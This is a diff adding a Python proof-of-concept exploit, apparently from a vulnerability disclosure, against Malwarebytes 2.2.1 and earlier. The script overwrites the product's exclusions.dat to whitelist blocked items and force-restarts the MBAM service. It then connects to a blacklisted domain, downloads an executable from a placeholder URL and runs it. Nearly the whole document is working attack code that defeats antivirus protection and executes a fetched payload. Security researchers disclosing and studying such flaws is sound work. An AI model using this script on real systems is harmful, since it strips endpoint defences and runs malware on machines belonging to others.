@@ -1,0 +1,41 @@
+#Proof-of-concept script to take demonstrate incorrect permissions and hardcoded assymetric encryption in Malwarebytes 2.2.1 and prior.  Fixed in 3.0.4.  Provide your own exclusions.dat
+#By Michael Spaling - provided as-is.  Use at your own risk.
+#http://www.securitytube.net/video/16690
+
+import socket
+import urllib
+import os
+import shutil
+import subprocess
+import win32serviceutil
+import time
+#User prompt to prevent the app from auto running the first test.
+raw_input("Press enter to deliver the exploit")
+#Overwrites a valid version of exclusions.dat with a malicious version of exclusions.dat that whitelists 7ZipSetup.exe and image6.putlocker.is both of which where blocked by Malwarebytes at the time of disclosure
+shutil.copy('exclusions.dat', 'C:\\ProgramData\\Malwarebytes\\Malwarebytes Anti-Malware\\exclusions.dat')
+#Restarts malware processes to force new whitelist to take affect.
+os.system('taskkill /f /im mbam.exe')
+servicename = 'MBAMService'
+subprocess.call('taskkill /f /fi "services eq %s"' % servicename)
+time.sleep(5)
+win32serviceutil.StartService(servicename)
+#User prompt to prevent the app from auto running the first test.
+raw_input("Press enter to initiate a malicious TCP connection")
+#initiates TPC connection on port 80 to image6.putlocker.is.  This domain is blacklisted by Malwarebytes Web Protect but will now be accessible.
+target_host = "image6.putlocker.is"
+target_port = 80
+client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+client.connect((target_host,target_port))
+#determines content of the HTTP request.  It's a GET request for the root index of image6.putlocker.is
+client.send("GET / HTTP/1.1\r\nHost: image6.putlocker.is\r\n\r\n")
+#Record the data that's recieved up to a maximum of 4096 bytes and display it's content.  This will be HTML code.
+response = client.recv(4096)
+print response
+#User prompt to prevent the app from auto running the second test.
+raw_input("Press enter to download and run malware.  Malware will open outside this window.")
+#Downloads a bundled version of 7ZipSetup.exe from a webserver and saves in C:\.  This file is blacklisted by Malwarebytes Malware Protect but will now be executed.
+urllib.urlretrieve ("http://YOURURLHERE/7ZipSetup.exe", "C:\\7ZipSetup.exe")
+#Runs 7ZipSetup.exe
+os.system("C:\\7ZipSetup.exe")
+#User prompt to prevent this app from auto closing.
+raw_input("Press enter to exit this program")
